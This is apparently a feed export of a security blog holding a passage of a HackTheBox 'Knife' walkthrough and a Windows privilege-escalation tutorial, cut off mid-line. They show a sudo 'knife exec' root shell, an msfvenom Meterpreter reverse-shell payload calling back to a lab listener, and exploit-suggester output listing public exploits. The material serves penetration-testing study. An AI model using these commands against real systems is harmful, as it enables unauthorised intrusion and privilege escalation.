class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> knife</span></span><br><span class="line">ERROR: You need to pass a sub-command (e.g., knife SUB-COMMAND)</span><br><span class="line"></span><br><span class="line">Usage: knife sub-command (options)</span><br><span class="line">    -s, --server-url URL             Chef Infra Server URL.</span><br><span class="line">        --chef-zero-host HOST        Host to start Chef Infra Zero on.</span><br><span class="line">        --chef-zero-port PORT        Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works.</span><br><span class="line">    -k, --key KEY                    Chef Infra Server API client key.</span><br><span class="line">        --[no-]color                 Use colored output, defaults to enabled.</span><br><span class="line">    -c, --config CONFIG              The configuration file to use.</span><br><span class="line">        --config-option OPTION=VALUE Override a single configuration option.</span><br><span class="line">        --defaults                   Accept default values for all questions.</span><br><span class="line">    -d, --disable-editing            Do not open EDITOR, just accept the data as is.</span><br><span class="line">    -e, --editor EDITOR              Set the editor to use for interactive commands.</span><br><span class="line">    -E, --environment ENVIRONMENT    Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored).</span><br><span class="line">        --[no-]fips                  Enable FIPS mode.</span><br><span class="line">    -F, --format FORMAT              Which format to use for output. (valid options: &#x27;summary&#x27;, &#x27;text&#x27;, &#x27;json&#x27;, &#x27;yaml&#x27;, or &#x27;pp&#x27;)</span><br><span class="line">        --[no-]listen                Whether a local mode (-z) server binds to a port.</span><br><span class="line">    -z, --local-mode                 Point knife commands at local repository instead of Chef Infra Server.</span><br><span class="line">    -u, --user USER                  Chef Infra Server API client username.</span><br><span class="line">        --print-after                Show the data after a destructive operation.</span><br><span class="line">        --profile PROFILE            The credentials profile to select.</span><br><span class="line">    -V, --verbose                    More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity.</span><br><span class="line">    -v, --version                    Show Chef Infra Client version.</span><br><span class="line">    -y, --yes                        Say yes to all prompts for confirmation.</span><br><span class="line">    -h, --help                       Show this help message.</span><br><span class="line"></span><br><span class="line">Available subcommands: (for details, knife SUB-COMMAND --help)</span><br><span class="line"></span><br><span class="line">************</span><br><span class="line"></span><br><span class="line">** EXEC COMMANDS **</span><br><span class="line">knife exec [SCRIPT] (options)</span><br><span class="line"></span><br><span class="line">** GOOGLE COMMANDS **</span><br><span class="line">knife google disk create NAME --gce-disk-size N (options)</span><br><span class="line">knife google disk delete NAME [NAME] (options)</span><br><span class="line">knife google disk list</span><br><span class="line">knife google image list</span><br><span class="line">knife google project quotas</span><br><span class="line">knife google region list</span><br><span class="line">knife google region quotas</span><br><span class="line">knife google server create NAME -m MACHINE_TYPE -I IMAGE (options)</span><br><span class="line">knife google server delete INSTANCE_NAME [INSTANCE_NAME] (options)</span><br><span class="line">knife google server list</span><br><span class="line">knife google server show INSTANCE_NAME (options)</span><br><span class="line">knife google zone list</span><br><span class="line"></span><br><span class="line">***************************************</span><br><span class="line">** YAML COMMANDS **</span><br><span class="line">knife yaml convert YAML_FILENAME [RUBY_FILENAME]</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNoZWYuaW8vd29ya3N0YXRpb24va25pZmVfZXhlYy8=">knifeå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><p><code>ææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo knife <span class="built_in">exec</span> --<span class="built_in">exec</span> <span class="string">&quot;exec &#x27;/bin/bash -i&#x27;&quot;</span></span></span><br><span class="line">bash: cannot set terminal process group (967): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">root@knife:/home/james#</span><br><span class="line">root@knife:/home/james# cd</span><br><span class="line">cd</span><br><span class="line">root@knife:~# ls</span><br><span class="line">ls</span><br><span class="line">delete.sh</span><br><span class="line">root.txt</span><br><span class="line">snap</span><br><span class="line">root@knife:~# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">***************************</span><br><span class="line">root@knife:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2021/07/29/HTB-knife/image-20210729150203513.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€æµ‹è¯•-æƒé™æå‡</title>
    <link href="https://lunamoore.github.io/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://lunamoore.github.io/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2021-07-29T06:12:42.000Z</published>
    <updated>2021-07-29T06:18:16.946Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-æ¼æ´å‘ç°"><a href="#0x01-æ¼æ´å‘ç°" class="headerlink" title="0x01.æ¼æ´å‘ç°"></a>0x01.æ¼æ´å‘ç°</h2><h3 id="1-WMICå‘ç°å®‰è£…è¡¥ä¸"><a href="#1-WMICå‘ç°å®‰è£…è¡¥ä¸" class="headerlink" title="1.WMICå‘ç°å®‰è£…è¡¥ä¸"></a>1.WMICå‘ç°å®‰è£…è¡¥ä¸</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h3 id="2-msfå‘ç°å®‰è£…è¡¥ä¸"><a href="#2-msfå‘ç°å®‰è£…è¡¥ä¸" class="headerlink" title="2.msfå‘ç°å®‰è£…è¡¥ä¸"></a>2.msfå‘ç°å®‰è£…è¡¥ä¸</h3><p><code>é¦–å…ˆä½¿ç”¨msfvenomç”Ÿæˆæ¶æ„ç¨‹åº</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=6666 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><a id="more"></a><p><code>å¯åŠ¨msfç›‘å¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>è¿è¡Œå¾—åˆ°shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:6666</span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.1.4:6666 -&gt; 192.168.1.5:49172) at 2021-07-27                                                                                                   04:35:49 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 5...</span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                   Connection</span><br><span class="line">  --  ----  ----                     -----------                   ----------</span><br><span class="line">  5         meterpreter x86/windows  JIYE\Administrator @ WIN7DC1  192.168.1.4:6666 -&gt; 192.168.1.5:49172 (192.168.1.5)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨post/windows/gather/enum_patchesæ¨¡å—å¿«é€Ÿæ‰«æç¼ºå¤±çš„è¡¥ä¸</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt;set session 5</span><br><span class="line">session =&gt; 5</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /root/.msf4/loot/20210727044047_default_192.168.1.5_enum_patches_596648.txt</span><br><span class="line">[+] KB2534111 installed on 7/10/2021</span><br><span class="line">[+] KB2999226 installed on 7/10/2021</span><br><span class="line">[+] KB4474419 installed on 7/10/2021</span><br><span class="line">[+] KB976902 installed on 11/21/2010</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ä½¿ç”¨post/multi/recon/local_exploit_suggesteræ¨¡å—æ‰¾å‡ºå¯èƒ½è¢«åˆ©ç”¨çš„æ¼æ´</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(windows/gather/enum_patches) &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 5</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.5 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 192.168.1.5 - 38 exploit checks are being tried...</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[-] 192.168.1.5 - Post interrupted by the console user</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-Windows-Exploit-Suggesterå‘ç°æ¼æ´"><a href="#3-Windows-Exploit-Suggesterå‘ç°æ¼æ´" class="headerlink" title="3.Windows Exploit Suggesterå‘ç°æ¼æ´"></a>3.Windows Exploit Suggesterå‘ç°æ¼æ´</h3><p><code>é¦–å…ˆä¸‹è½½æ•°æ®åº“</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;python2 windows-exploit-suggester.py --update</span><br><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[+] writing to file 2021-07-27-mssb.xls</span><br><span class="line">[*] done</span><br><span class="line"></span><br><span class="line">E:\&gt;</span><br></pre></td></tr></table></figure><p><code>å®‰è£…xlrdæ–‡ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install xlrd==1.2.0</span><br></pre></td></tr></table></figure><p><code>æ£€æµ‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;python2 windows-exploit-suggester.py -d 2021-07-27-mssb.xls -i systeminfo.txt &gt; out.txt</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹out.txtæ–‡ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[*] database file detected as xls or xlsx based on extension</span><br><span class="line">[*] attempting to read from the systeminfo input file</span><br><span class="line">[+] systeminfo input file read successfully (utf-8)</span><br><span class="line">[*] querying database file for potential vulnerabilities</span><br><span class="line">[*] comparing the 4 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits</span><br><span class="line">[*] there are now 386 remaining vulns</span><br><span class="line">[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin</span><br><span class="line">[+] windows version identified as &#x27;Windows 7 SP1 64-bit&#x27;</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - &#x27;win32k.sys&#x27; &#x27;NtSetWindowLongPtr&#x27; Privilege Escalation (MS16-135) (2)</span><br><span class="line">[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)</span><br><span class="line">[*] </span><br><span class="line">[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important</span><br><span class="line">[*]   https://github.com/foxglovesec/RottenPotato</span><br><span class="line">[*]   https://github.com/Kevin-Robertson/Tater</span><br><span class="line">[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege</span><br><span class="line">[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-059: Security Update for Windows Media Center (3150220) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-056: Security Update for Windows Journal (3156761) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 JavaÂ­ScriptÂ­StackÂ­Walker Memory Corruption (MS15-056)</span><br><span class="line">[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 JavaÂ­ScriptÂ­StackÂ­Walker memory corruption</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)</span><br><span class="line">[*] </span><br><span class="line">[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important</span><br><span class="line">[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-134: Security Update for Windows Media Center to Address Remote Code Execution (3108669) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38911/ -- Microsoft Windows Media Center Library Parsing RCE Vulnerability aka self-executing&#x27; MCL File, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38912/ -- Microsoft Windows Media Center Link File Incorrectly Resolved Reference, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object - &#x27;els.dll&#x27; DLL Planting (MS15-134)</span><br><span class="line">[*]   https://code.google.com/p/google-security-research/issues/detail?id=514 -- Microsoft Office / COM Object DLL Planting with els.dll</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-100: Vulnerability in Windows Media Center Could Allow Remote Code Execution (3087918) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38195/ -- MS15-100 Microsoft Windows Media Center MCL Vulnerability, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38151/ -- Windows Media Center - Command Execution (MS15-100), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important</span><br><span class="line">[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), 